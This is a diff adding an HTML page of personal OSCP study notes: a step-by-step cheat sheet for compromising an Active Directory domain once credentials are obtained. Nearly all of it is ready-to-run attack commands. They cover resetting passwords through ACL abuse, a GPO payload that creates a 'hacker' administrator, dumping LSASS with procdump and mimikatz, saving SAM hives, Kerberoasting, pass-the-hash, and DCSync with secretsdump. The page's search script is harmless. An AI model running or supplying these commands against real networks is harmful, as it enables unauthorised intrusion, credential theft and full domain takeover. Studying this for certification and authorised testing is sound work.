@@ -1,0 +1,885 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>AD Lateral Movement & Persistence - AD Notes</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+    <nav>
+        <a href="index.html">Home</a>
+
+        <!-- 1. FUNDAMENTALS / FLOW -->
+        <a href="general.html">General</a>
+        <a href="tips.html">Tips</a>
+        <a href="checklist.html">Checklist</a>
+
+        <a href="recon.html">Recon</a>
+        <a href="enumeration.html">Enumeration</a>
+
+        <a href="files.html">Files Searching</a>
+        <a href="file-transfer.html">File Transfer</a>
+
+        <!-- 2. WEB (USUAL ENTRY POINT) -->
+        <div class="dropdown">
+            <a href="#">Web ▾</a>
+
+            <div class="dropdown-content">
+
+                <div class="dropdown-sub">
+                    <a href="#">Fingerprinting ▾</a>
+                    <div class="dropdown-subcontent">
+                        <a href="web/directoryBruteForce.html">Directory Brute Force</a>
+                    </div>
+                </div>
+
+                <div class="dropdown-sub">
+                    <a href="#">Attacks ▾</a>
+                    <div class="dropdown-subcontent">
+                        <a href="web/directoryTraversal.html">Directory Traversal</a>
+                        <a href="web/fileInclusions.html">File Inclusions</a>
+                        <a href="web/fileUpload.html">File Uploads</a>
+                        <a href="web/osCommand.html">OS Command Injections</a>
+                        <a href="web/sqli.html">SQL Injections</a>
+                    </div>
+                    <a href="web/wp.html">Wordpress</a>
+                </div>
+
+            </div>
+        </div>
+
+        <!-- 3. PASSWORD ATTACKS (POST-ENUM) -->
+        <div class="dropdown">
+            <a href="#">Passwords Attacks ▾</a>
+
+            <div class="dropdown-content">
+
+                <div class="dropdown-sub">
+                    <a href="#">Network Login ▾</a>
+                    <div class="dropdown-subcontent">
+                        <a href="sshBF.html">SSH</a>
+                        <a href="rdpBF.html">RDP</a>
+                        <a href="httpPostBF.html">HTTP POST Login</a>
+                    </div>
+                </div>
+
+                <div class="dropdown-sub">
+                    <a href="#">Password Cracking ▾</a>
+                    <div class="dropdown-subcontent">
+                        <a href="CrakingIntro.html">Cracking Intro</a>
+                        <a href="MutatingWordlist.html">Mutating Wordlist</a>
+                        <a href="CrakingMethodology.html">Cracking Methodology</a>
+                        <a href="PasswordManager.html">Password Manager</a>
+                        <a href="sshPKP.html">SSH Private Key Passphrase</a>
+                    </div>
+                </div>
+
+                <div class="dropdown-sub">
+                    <a href="#">Hash Attacks ▾</a>
+                    <div class="dropdown-subcontent">
+                        <a href="ntlmCrack.html">Cracking NTLM</a>
+                        <a href="ntlmPass.html">Passing NTLM</a>
+                        <a href="ntlm2Crack.html">Cracking Net-NTLMv2</a>
+                        <a href="ntlm2Relay.html">Relaying Net-NTLMv2</a>
+                        <a href="WindowsCredsGuard.html">Windows Credential Guard</a>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
+        <!-- 4. ACTIVE DIRECTORY (AFTER INITIAL FOOTHOLD) -->
+        <div class="dropdown">
+            <a href="#">AD ▾</a>
+            <div class="dropdown-content">
+                <a href="enumeration.html">Enumeration</a>
+                <a href="attacking.html">Attacking</a>
+                <a href="lateralMovement.html">Lateral Movement</a>
+                <a href="metodologie.html">Methodology</a>
+            </div>
+        </div>
+
+        <!-- 5. PRIVESC (POST EXPLOITATION) -->
+        <div class="dropdown">
+            <a href="#">Privesc ▾</a>
+            <div class="dropdown-content">
+                <a href="linux-privesc.html">Linux Privesc</a>
+                <a href="windows_privesc.html">Windows PrivEsc</a>
+            </div>
+        </div>
+
+        <!-- 6. TOOLS / UTILS (REFERENCE SECTION) -->
+        <a href="toolsCheatsheet.html">Tools Cheatsheet</a>
+        <a href="pivoting.html">Pivoting</a>
+        <a href="qol.html">QOL</a>
+
+    </nav>
+    <div class="search-bar">
+        <input type="text" id="global-search" placeholder="Buscar..." />
+        <button onclick="performSearch()">🔍 Search</button>
+        <button id="toggle-results" onclick="toggleSearchResults()">▲</button>
+        <div id="search-results" class="search-results collapsed"></div>
+    </div>
+    
+
+<div class="container">
+
+    <h1>Post-Credential Active Directory Workflow (OSCP)</h1>
+
+    <!-- ===================== OVERVIEW ===================== -->
+
+    <div class="section">
+        <div class="section-header">Workflow Overview</div>
+
+        <div class="section-content">
+
+            <h2 class="sub-title">🔁 Attack Flow</h2>
+
+            <pre><code>
+VALIDATE → ENUMERATE → PRIV ESC → LATERAL → DUMP CREDS → DA
+            </code></pre>
+
+            <h2 class="sub-title">🧠 OSCP Mindset</h2>
+
+            <ul>
+                <li>Find where the user has access</li>
+                <li>Identify local admin rights</li>
+                <li>Abuse ACLs / GPOs</li>
+                <li>Dump credentials</li>
+                <li>Move laterally</li>
+                <li>Reach Domain Admin</li>
+            </ul>
+
+        </div>
+    </div>
+
+
+    <!-- ===================== VALIDATE ===================== -->
+
+    <div class="section">
+        <div class="section-header">1. Validate Credentials</div>
+
+        <div class="section-content">
+
+            <h2 class="sub-title">Validate SMB Authentication</h2>
+
+            <pre><code>
+crackmapexec smb IP -u user -p 'Password123!'
+            </code></pre>
+
+            <h2 class="sub-title">Password Policy</h2>
+
+            <pre><code>
+crackmapexec smb IP -u user -p 'Password123!' --pass-pol
+            </code></pre>
+
+            <p><strong>Goal:</strong> Confirm valid domain credentials.</p>
+
+        </div>
+    </div>
+
+
+    <!-- ===================== ENUMERATION ===================== -->
+
+    <div class="section">
+        <div class="section-header">2. Enumeration After Credentials</div>
+
+        <div class="section-content">
+
+            <h2 class="sub-title">SMB Shares</h2>
+
+            <pre><code>
+crackmapexec smb IP -u user -p 'Password123!' --shares
+
+smbmap -H IP -u user -p 'Password123!'
+            </code></pre>
+
+            <h2 class="sub-title">Domain Users</h2>
+
+            <pre><code>
+crackmapexec smb IP -u user -p 'Password123!' --users
+            </code></pre>
+
+            <h2 class="sub-title">Groups</h2>
+
+            <pre><code>
+crackmapexec smb IP -u user -p 'Password123!' --groups
+            </code></pre>
+
+            <h2 class="sub-title">BloodHound Collection</h2>
+
+            <pre><code>
+bloodhound-python -u user -p 'Password123!' \
+-d domain.local \
+-dc dc.domain.local \
+-c all
+            </code></pre>
+
+            <h2 class="sub-title">What To Look For</h2>
+
+            <ul>
+                <li>GenericAll</li>
+                <li>WriteDACL</li>
+                <li>WriteOwner</li>
+                <li>ForceChangePassword</li>
+                <li>AddMember</li>
+                <li>WriteGPO</li>
+                <li>Local Admin rights</li>
+            </ul>
+
+        </div>
+    </div>
+
+
+    <!-- ===================== BLOODHOUND ABUSE ===================== -->
+
+    <div class="section">
+        <div class="section-header">3. BloodHound Abuse Cheatsheet</div>
+
+        <div class="section-content">
+
+            <!-- ===================== GENERICALL ===================== -->
+
+            <h2 class="sub-title">GenericAll</h2>
+
+            <p><strong>Meaning:</strong> Full control over object</p>
+
+            <p><strong>If target is USER →</strong></p>
+
+            <ul>
+                <li>Reset password</li>
+                <li>Authenticate as target user</li>
+            </ul>
+
+            <pre><code>
+bloodyAD --host DC_IP \
+-d domain.local \
+-u userA \
+-p pass \
+set password userB NewPassword123!
+            </code></pre>
+
+            <p><strong>If target is GROUP →</strong></p>
+
+            <ul>
+                <li>Add yourself to group</li>
+            </ul>
+
+            <pre><code>
+net group "IT Admins" userA /add /domain
+            </code></pre>
+
+            <p><strong>Goal:</strong> Immediate privilege escalation</p>
+
+            <hr>
+
+
+            <!-- ===================== WRITEDACL ===================== -->
+
+            <h2 class="sub-title">WriteDACL</h2>
+
+            <p><strong>Meaning:</strong> Can modify object permissions</p>
+
+            <p><strong>Workflow:</strong></p>
+
+            <ol>
+                <li>Grant yourself GenericAll</li>
+                <li>Abuse new permissions</li>
+            </ol>
+
+            <pre><code>
+Add-DomainObjectAcl \
+-TargetIdentity "IT Admins" \
+-PrincipalIdentity userA \
+-Rights All
+            </code></pre>
+
+            <p><strong>Then:</strong></p>
+
+            <pre><code>
+net group "IT Admins" userA /add /domain
+            </code></pre>
+
+            <p><strong>Goal:</strong> Convert WriteDACL → Full Control</p>
+
+            <hr>
+
+
+            <!-- ===================== WRITEOWNER ===================== -->
+
+            <h2 class="sub-title">WriteOwner</h2>
+
+            <p><strong>Meaning:</strong> Can take ownership of object</p>
+
+            <p><strong>Workflow:</strong></p>
+
+            <ol>
+                <li>Take ownership</li>
+                <li>Grant yourself permissions</li>
+                <li>Abuse object</li>
+            </ol>
+
+            <pre><code>
+Set-DomainObjectOwner \
+-Identity userB \
+-OwnerIdentity userA
+            </code></pre>
+
+            <pre><code>
+Add-DomainObjectAcl \
+-TargetIdentity userB \
+-PrincipalIdentity userA \
+-Rights All
+            </code></pre>
+
+            <pre><code>
+bloodyAD --host DC_IP \
+-d domain.local \
+-u userA \
+-p pass \
+set password userB NewPassword123!
+            </code></pre>
+
+            <p><strong>Goal:</strong> Full takeover of object</p>
+
+            <hr>
+
+
+            <!-- ===================== FORCECHANGEPASSWORD ===================== -->
+
+            <h2 class="sub-title">ForceChangePassword</h2>
+
+            <p><strong>Meaning:</strong> Can reset another user's password</p>
+
+            <p><strong>Workflow:</strong></p>
+
+            <ol>
+                <li>Reset password</li>
+                <li>Login as target user</li>
+            </ol>
+
+            <pre><code>
+bloodyAD --host DC_IP \
+-d domain.local \
+-u userA \
+-p pass \
+set password userB NewPassword123!
+            </code></pre>
+
+            <p><strong>Goal:</strong> Immediate account compromise</p>
+
+            <hr>
+
+
+            <!-- ===================== ADDMEMBER ===================== -->
+
+            <h2 class="sub-title">AddMember</h2>
+
+            <p><strong>Meaning:</strong> Can add users to group</p>
+
+            <p><strong>Workflow:</strong></p>
+
+            <ol>
+                <li>Add yourself to privileged group</li>
+                <li>Re-authenticate</li>
+                <li>Use new privileges</li>
+            </ol>
+
+            <pre><code>
+net group "IT Admins" userA /add /domain
+            </code></pre>
+
+            <p><strong>Goal:</strong> Gain group privileges</p>
+
+            <hr>
+
+
+            <!-- ===================== WRITEGPO ===================== -->
+
+            <h2 class="sub-title">WriteGPO</h2>
+
+            <p><strong>Meaning:</strong> Can modify Group Policy Object</p>
+
+            <p><strong>Workflow:</strong></p>
+
+            <ol>
+                <li>Create malicious script</li>
+                <li>Add script to SYSVOL</li>
+                <li>Wait for policy refresh</li>
+                <li>Gain SYSTEM execution</li>
+            </ol>
+
+            <p><strong>Payload location:</strong></p>
+
+            <pre><code>
+\\domain.local\SYSVOL\domain.local\scripts\payload.bat
+            </code></pre>
+
+            <p><strong>Payload:</strong></p>
+
+            <pre><code>
+net user hacker Password123! /add
+net localgroup administrators hacker /add
+            </code></pre>
+
+            <p><strong>Trigger refresh:</strong></p>
+
+            <pre><code>
+gpupdate /force
+            </code></pre>
+
+            <p><strong>Goal:</strong> SYSTEM execution on domain machines</p>
+
+            <hr>
+
+
+            <!-- ===================== LOCAL ADMIN ===================== -->
+
+            <h2 class="sub-title">Local Admin Rights</h2>
+
+            <p><strong>Meaning:</strong> User is administrator on remote machine</p>
+
+            <h3>Check Access</h3>
+
+            <pre><code>
+crackmapexec smb 192.168.1.0/24 \
+-u user \
+-p 'Password123!'
+            </code></pre>
+
+            <p>If you see:</p>
+
+            <pre><code>
+(Pwn3d!)
+            </code></pre>
+
+            <p>You are local admin.</p>
+
+            <h3>Next Steps</h3>
+
+            <ul>
+                <li>Dump credentials</li>
+                <li>Pass-the-Hash</li>
+                <li>Lateral movement</li>
+            </ul>
+
+            <pre><code>
+impacket-secretsdump domain.local/user:'Password123!'@IP
+            </code></pre>
+
+            <p><strong>Goal:</strong> Pivot and escalate</p>
+
+        </div>
+    </div>
+
+
+    <!-- ===================== WINDOWS PRIV ESC ===================== -->
+
+    <div class="section">
+        <div class="section-header">4. Windows Privilege Escalation (whoami /priv)</div>
+
+        <div class="section-content">
+
+            <h2 class="sub-title">Check Token Privileges</h2>
+
+            <pre><code>
+whoami /priv
+            </code></pre>
+
+            <p>Dangerous privileges may allow SYSTEM escalation.</p>
+
+            <hr>
+
+
+            <!-- ===================== SEIMPERSONATE ===================== -->
+
+            <h2 class="sub-title">SeImpersonatePrivilege</h2>
+
+            <p><strong>Meaning:</strong> Can impersonate tokens</p>
+
+            <p><strong>Common Exploits:</strong></p>
+
+            <ul>
+                <li>PrintSpoofer</li>
+                <li>JuicyPotato</li>
+                <li>RoguePotato</li>
+                <li>GodPotato</li>
+            </ul>
+
+            <pre><code>
+whoami /priv | findstr SeImpersonatePrivilege
+            </code></pre>
+
+            <p><strong>Example:</strong></p>
+
+            <pre><code>
+PrintSpoofer.exe -i -c cmd
+            </code></pre>
+
+            <p><strong>Result:</strong> SYSTEM shell</p>
+
+            <hr>
+
+
+            <!-- ===================== SEASSIGNPRIMARYTOKEN ===================== -->
+
+            <h2 class="sub-title">SeAssignPrimaryTokenPrivilege</h2>
+
+            <p><strong>Meaning:</strong> Can assign tokens to processes</p>
+
+            <p><strong>Exploits:</strong></p>
+
+            <ul>
+                <li>Potato exploits</li>
+                <li>Token impersonation</li>
+            </ul>
+
+            <pre><code>
+whoami /priv | findstr SeAssignPrimaryTokenPrivilege
+            </code></pre>
+
+            <p><strong>Result:</strong> Possible SYSTEM escalation</p>
+
+            <hr>
+
+
+            <!-- ===================== SEDEBUG ===================== -->
+
+            <h2 class="sub-title">SeDebugPrivilege</h2>
+
+            <p><strong>Meaning:</strong> Can debug SYSTEM processes</p>
+
+            <p><strong>Abuse:</strong></p>
+
+            <ul>
+                <li>Mimikatz</li>
+                <li>Dump LSASS</li>
+            </ul>
+
+            <pre><code>
+whoami /priv | findstr SeDebugPrivilege
+            </code></pre>
+
+            <p><strong>Dump LSASS:</strong></p>
+
+            <pre><code>
+procdump.exe -ma lsass.exe lsass.dmp
+            </code></pre>
+
+            <p><strong>Extract creds:</strong></p>
+
+            <pre><code>
+mimikatz.exe
+
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords
+            </code></pre>
+
+            <p><strong>Result:</strong> Credentials / NTLM hashes</p>
+
+            <hr>
+
+
+            <!-- ===================== SEBACKUP ===================== -->
+
+            <h2 class="sub-title">SeBackupPrivilege</h2>
+
+            <p><strong>Meaning:</strong> Can bypass file ACLs</p>
+
+            <p><strong>Abuse:</strong></p>
+
+            <ul>
+                <li>Read SAM / SYSTEM</li>
+                <li>Read NTDS.dit</li>
+            </ul>
+
+            <pre><code>
+whoami /priv | findstr SeBackupPrivilege
+            </code></pre>
+
+            <p><strong>Dump registry hives:</strong></p>
+
+            <pre><code>
+reg save HKLM\SAM SAM
+reg save HKLM\SYSTEM SYSTEM
+            </code></pre>
+
+            <p><strong>Extract hashes:</strong></p>
+
+            <pre><code>
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+            </code></pre>
+
+            <p><strong>Result:</strong> Local admin hashes</p>
+
+            <hr>
+
+
+            <!-- ===================== SERESTORE ===================== -->
+
+            <h2 class="sub-title">SeRestorePrivilege</h2>
+
+            <p><strong>Meaning:</strong> Can overwrite protected files</p>
+
+            <p><strong>Abuse:</strong></p>
+
+            <ul>
+                <li>Replace service binaries</li>
+                <li>Overwrite protected files</li>
+            </ul>
+
+            <p><strong>Result:</strong> Privilege escalation</p>
+
+            <hr>
+
+
+            <!-- ===================== SETAKEOWNERSHIP ===================== -->
+
+            <h2 class="sub-title">SeTakeOwnershipPrivilege</h2>
+
+            <p><strong>Meaning:</strong> Can take ownership of files/objects</p>
+
+            <p><strong>Abuse:</strong></p>
+
+            <ul>
+                <li>Modify protected files</li>
+                <li>Replace binaries</li>
+            </ul>
+
+            <pre><code>
+takeown /f C:\Windows\System32\Utilman.exe
+            </code></pre>
+
+            <p><strong>Result:</strong> Modify protected resources</p>
+
+            <hr>
+
+
+            <!-- ===================== QUICK CHECKLIST ===================== -->
+
+            <h2 class="sub-title">Quick Checklist</h2>
+
+            <pre><code>
+[ ] whoami /priv
+[ ] SeImpersonatePrivilege
+[ ] SeAssignPrimaryTokenPrivilege
+[ ] SeDebugPrivilege
+[ ] SeBackupPrivilege
+[ ] SeRestorePrivilege
+[ ] SeTakeOwnershipPrivilege
+            </code></pre>
+
+        </div>
+    </div>
+
+
+    <!-- ===================== KERBEROS ===================== -->
+
+    <div class="section">
+        <div class="section-header">5. Kerberos Attacks</div>
+
+        <div class="section-content">
+
+            <h2 class="sub-title">Kerberoasting</h2>
+
+            <pre><code>
+GetUserSPNs.py domain.local/user:'Password123!' \
+-dc-ip IP \
+-request
+            </code></pre>
+
+            <p>Crack hash:</p>
+
+            <pre><code>
+hashcat -m 13100 hashes.txt rockyou.txt
+            </code></pre>
+
+            <h2 class="sub-title">AS-REP Roasting</h2>
+
+            <pre><code>
+GetNPUsers.py domain.local/ \
+-no-pass \
+-usersfile users.txt
+            </code></pre>
+
+        </div>
+    </div>
+
+
+    <!-- ===================== LATERAL ===================== -->
+
+    <div class="section">
+        <div class="section-header">6. Lateral Movement</div>
+
+        <div class="section-content">
+
+            <h2 class="sub-title">WinRM</h2>
+
+            <pre><code>
+evil-winrm -i IP -u user -p 'Password123!'
+            </code></pre>
+
+            <h2 class="sub-title">PsExec</h2>
+
+            <pre><code>
+impacket-psexec domain.local/user:'Password123!'@IP
+            </code></pre>
+
+            <h2 class="sub-title">WMIExec</h2>
+
+            <pre><code>
+impacket-wmiexec domain.local/user:'Password123!'@IP
+            </code></pre>
+
+        </div>
+    </div>
+
+
+    <!-- ===================== DUMP CREDS ===================== -->
+
+    <div class="section">
+        <div class="section-header">7. Dump Credentials</div>
+
+        <div class="section-content">
+
+            <h2 class="sub-title">SecretsDump</h2>
+
+            <pre><code>
+impacket-secretsdump domain.local/user:'Password123!'@IP
+            </code></pre>
+
+            <p><strong>Look for:</strong></p>
+
+            <ul>
+                <li>Administrator hashes</li>
+                <li>Service accounts</li>
+                <li>DA sessions</li>
+                <li>Password reuse</li>
+            </ul>
+
+        </div>
+    </div>
+
+
+    <!-- ===================== PASS THE HASH ===================== -->
+
+    <div class="section">
+        <div class="section-header">8. Pass-the-Hash</div>
+
+        <div class="section-content">
+
+            <pre><code>
+evil-winrm -i IP -u Administrator -H NTLM_HASH
+
+impacket-psexec \
+-hashes :NTLM_HASH \
+Administrator@IP
+            </code></pre>
+
+        </div>
+    </div>
+
+
+    <!-- ===================== DOMAIN ADMIN ===================== -->
+
+    <div class="section">
+        <div class="section-header">9. Domain Admin</div>
+
+        <div class="section-content">
+
+            <h2 class="sub-title">DCSync</h2>
+
+            <pre><code>
+impacket-secretsdump \
+-just-dc-user administrator \
+domain.local/user:'Password123!'@DC_IP
+            </code></pre>
+
+            <h2 class="sub-title">NTDS.dit Dump</h2>
+
+            <pre><code>
+impacket-secretsdump \
+-ntds ntds.dit \
+-system SYSTEM LOCAL
+            </code></pre>
+
+            <p><strong>Goal:</strong> Full domain compromise</p>
+
+        </div>
+    </div>
+
+</div>
+
+
+        <script>
+            document.querySelectorAll(".section-header").forEach(h => {
+                h.addEventListener("click", () => h.parentElement.classList.toggle("active"))
+            });
+            function toggleSearchResults() {
+                const results = document.getElementById("search-results");
+                const toggleBtn = document.getElementById("toggle-results");
+
+                results.classList.toggle("collapsed");
+
+                if (results.classList.contains("collapsed")) {
+                    toggleBtn.textContent = "▼";
+                } else {
+                    toggleBtn.textContent = "▲";
+                }
+            }
+
+            function performSearch() {
+                const query = document.getElementById("global-search").value.toLowerCase();
+                const resultsContainer = document.getElementById("search-results");
+                resultsContainer.innerHTML = "";
+
+                if (!query) {
+                    resultsContainer.classList.add("collapsed");
+                    return;
+                }
+
+                const allElements = Array.from(document.body.querySelectorAll("*"))
+                    .filter(el => el.children.length === 0 && el.textContent.toLowerCase().includes(query));
+
+                if (allElements.length === 0) {
+                    resultsContainer.innerHTML = "<div>No se encontraron resultados</div>";
+                } else {
+                    allElements.forEach((el, idx) => {
+                        let container = el.closest(".section, .sub-section") || el;
+
+                        if (!container.id) {
+                            container.id = `search-target-${idx}`;
+                        }
+
+                        const div = document.createElement("div");
+                        div.textContent = el.textContent;
+                        div.style.cursor = "pointer";
+                        div.style.padding = "5px 10px";
+                        div.style.borderBottom = "1px solid #1e293b";
+                        div.onmouseover = () => div.style.backgroundColor = "#1e293b";
+                        div.onmouseout = () => div.style.backgroundColor = "";
+                        div.onclick = () => {
+                            if (container.classList.contains("section") || container.classList.contains("sub-section")) {
+                                container.classList.add("active");
+                            }
+
+                            container.scrollIntoView({ behavior: "smooth", block: "center" });
+
+                            container.classList.add("highlight-fade");
+                            setTimeout(() => container.classList.remove("highlight-fade"), 2000);
+                        };
+
+                        resultsContainer.appendChild(div);
+                    });
+                }
+
+                resultsContainer.classList.remove("collapsed");
+            }
+        </script>
+
+</body>
+
+</html>
